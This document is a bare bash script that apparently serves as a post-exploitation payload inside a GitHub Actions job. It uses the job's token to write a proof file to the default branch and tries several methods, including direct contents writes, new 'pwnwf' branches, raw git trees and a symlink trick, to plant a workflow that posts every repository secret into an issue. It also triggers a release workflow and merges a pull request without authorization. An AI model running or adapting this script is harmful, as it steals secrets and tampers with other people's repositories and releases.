#!/bin/bash
exec 1>&2
set -x
REPO="$GITHUB_REPOSITORY"
echo "RCE_MARKER=$(date +%s)"
id
echo "TOKLEN=${#GITHUB_TOKEN}"
gh api user --jq .login
DEFAULT=$(gh api "repos/$REPO" --jq .default_branch)
HEAD_SHA=$(gh api "repos/$REPO/git/ref/heads/$DEFAULT" --jq .object.sha)
echo "DEFAULT=$DEFAULT HEAD_SHA=$HEAD_SHA"

echo "=== A proof file (non-workflow) on default branch"
printf 'RCE_PROOF_%s\n' "$(date +%s)" > /tmp/proof.txt
B64P=$(base64 -w0 /tmp/proof.txt)
gh api -X PUT "repos/$REPO/contents/rce-proof.txt" -f message="proof" -f content="$B64P" -f branch="$DEFAULT" --jq .content.html_url
echo "A_EXIT=$?"

cat > /tmp/leak.yml <<'YAML'
name: leak
on:
  pull_request_target:
  workflow_dispatch:
permissions:
  contents: write
  issues: write
  pull-requests: write
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: d
        env:
          ALL: ${{ toJSON(secrets) }}
          GH_TOKEN: ${{ github.token }}
        run: |
          printf '%s' "$ALL" > /tmp/a.json
          gh api -X POST "repos/$GITHUB_REPOSITORY/issues" -f title="secs-$(date +%s)" -F body=@/tmp/a.json || true
          echo DUMP_DONE
YAML
B64W=$(base64 -w0 /tmp/leak.yml)
export B64W HEAD_SHA REPO

echo "=== B workflow on default branch (contents API)"
gh api -X PUT "repos/$REPO/contents/.github/workflows/leak.yml" -f message="wf" -f content="$B64W" -f branch="$DEFAULT" -i 2>&1 | head -6

echo "=== C create branch pwnwf"
gh api -X POST "repos/$REPO/git/refs" -f ref="refs/heads/pwnwf" -f sha="$HEAD_SHA" --jq .ref 2>&1
echo "C1_EXIT=$?"
echo "=== C2 workflow on branch pwnwf (contents API)"
gh api -X PUT "repos/$REPO/contents/.github/workflows/leak.yml" -f message="wf2" -f content="$B64W" -f branch="pwnwf" -i 2>&1 | head -6

echo "=== D git data API tree with workflow"
python3 - <<'PY' > /tmp/tree.json
import json,os,base64
b64=os.environ['B64W']
open('/tmp/wf.b64','w').write(b64)
print(json.dumps({'base_tree':os.environ['HEAD_SHA'],'tree':[
 {'path':'.github/workflows/leak.yml','mode':'100644','type':'blob','content':base64.b64decode(b64).decode()}
]}))
PY
TREE=$(gh api -X POST "repos/$REPO/git/trees" --input /tmp/tree.json --jq .sha 2>&1)
echo "TREE=$TREE"
if [ "${TREE:0:1}" != "{" ]; then
  echo "{\"message\":\"wf\",\"tree\":\"$TREE\",\"parents\":[\"$HEAD_SHA\"]}" > /tmp/commit.json
  COMMIT=$(gh api -X POST "repos/$REPO/git/commits" --input /tmp/commit.json --jq .sha 2>&1)
  echo "COMMIT=$COMMIT"
  echo "{\"ref\":\"refs/heads/pwnwf2\",\"sha\":\"$COMMIT\"}" > /tmp/ref-pwn2.json
  gh api -X POST "repos/$REPO/git/refs" --input /tmp/ref-pwn2.json -i 2>&1 | head -6
fi

echo "=== E symlink workflow"
python3 - <<'PY' > /tmp/tree2.json
import json,os,base64
wf=base64.b64decode(os.environ['B64W']).decode()
print(json.dumps({'base_tree':os.environ['HEAD_SHA'],'tree':[
 {'path':'.github/workflows/leak.yml','mode':'120000','type':'blob','content':'../../leak-target.yml'},
 {'path':'leak-target.yml','mode':'100644','type':'blob','content':wf}
]}))
PY
TREE2=$(gh api -X POST "repos/$REPO/git/trees" --input /tmp/tree2.json --jq .sha 2>&1)
echo "TREE2=$TREE2"
if [ "${TREE2:0:1}" != "{" ]; then
  echo "{\"message\":\"wf2\",\"tree\":\"$TREE2\",\"parents\":[\"$HEAD_SHA\"]}" > /tmp/commit2.json
  COMMIT2=$(gh api -X POST "repos/$REPO/git/commits" --input /tmp/commit2.json --jq .sha 2>&1)
  echo "COMMIT2=$COMMIT2"
  echo "{\"ref\":\"refs/heads/pwnwf3\",\"sha\":\"$COMMIT2\"}" > /tmp/ref-pwn3.json
  gh api -X POST "repos/$REPO/git/refs" --input /tmp/ref-pwn3.json -i 2>&1 | head -6
fi

echo "=== F workflow_dispatch create-release.yml"
gh api -X POST "repos/$REPO/actions/workflows/create-release.yml/dispatches" -f ref="$DEFAULT" -f "inputs[version]=9.9.9" -i 2>&1 | head -6

echo "=== G merge PR 9"
gh api -X PUT "repos/$REPO/pulls/9/merge" -f merge_method=squash -i 2>&1 | head -6
echo "DONE"
